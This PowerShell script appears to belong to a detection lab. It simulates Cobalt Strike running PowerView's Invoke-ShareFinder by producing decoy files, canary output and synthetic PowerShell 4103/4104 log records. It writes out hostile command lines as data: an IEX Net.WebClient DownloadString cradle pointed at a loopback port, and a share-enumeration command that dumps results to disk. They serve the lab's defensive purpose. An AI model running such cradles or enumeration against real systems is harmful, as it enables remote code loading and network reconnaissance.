#Requires -Version 5.1
#Requires -RunAsAdministrator
[CmdletBinding()]param([switch]$LabConfirmed)
. "$PSScriptRoot\ShareFinderSim-utilities.ps1"
Assert-ShareFinderSafety -LabConfirmed:$LabConfirmed
$paths=Initialize-ShareFinderEnvironment

Write-ShareFinderFile(Join-Path $paths.Tool 'Invoke-ShareFinder.ps1')'# INERT ShareFinder-name canary. No PowerView functions or network code.''tool canary'
$decoy=Join-Path $paths.Tool 'powershell.exe'
New-ShareFinderDecoy $decoy 'Signed cmd.exe stand-in for Cobalt Strike-spawned PowerShell'
$direct='Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\shares.txt'
$proxy="IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:10966/'); Invoke-ShareFinder -CheckShareAccess"
Invoke-ShareFinderDecoy $decoy $direct 'beacon.exe'
Invoke-ShareFinderDecoy $decoy $proxy 'beacon.exe'
Invoke-ShareFinderLoopback 10966 'Cobalt Strike built-in proxy script load at http://127.0.0.1:10966/' 'HTTP loopback marker'
Write-ShareFinderFile(Join-Path $paths.Tool 'shares.txt')"GENERATED SHAREFINDER OUTPUT`n\\LAB-FILE01\Files`n\\LAB-WS01\C$`nNo share was queried or accessed."'generated command-output canary'
$psLog=Join-Path $paths.Logs 'PowerShell-Operational.jsonl'
Add-ShareFinderJsonLine $psLog @{eventId=4103;provider='Microsoft-Windows-PowerShell';module='Invoke-ShareFinder';payload=$direct;synthetic=$true} 'PowerShell module logging canary'
Add-ShareFinderJsonLine $psLog @{eventId=4104;provider='Microsoft-Windows-PowerShell';scriptBlock='Invoke-ShareFinder parameter and NetShareEnum strings represented; no implementation present';synthetic=$true} 'PowerShell script-block logging canary'
Write-ShareFinderFile(Join-Path $paths.Evidence 'execution-negative-record.json')(@{PowerViewLoaded=$false;scriptDownloaded=$false;ShareFinderInvoked=$false;sharesFileContainsGeneratedDataOnly=$true}|ConvertTo-Json)'execution safety record'
Add-ShareFinderTimeline 0 execution 'Direct and Cobalt proxy ShareFinder invocation command lines represented' @{PowerShellCodeExecuted=$false;technique='T1059.001'}
Add-ShareFinderTimeline 1 detection 'Synthetic PowerShell 4103 and 4104 records emitted' @{realEventLogModified=$false;eventsGeneratedAsFiles=2}
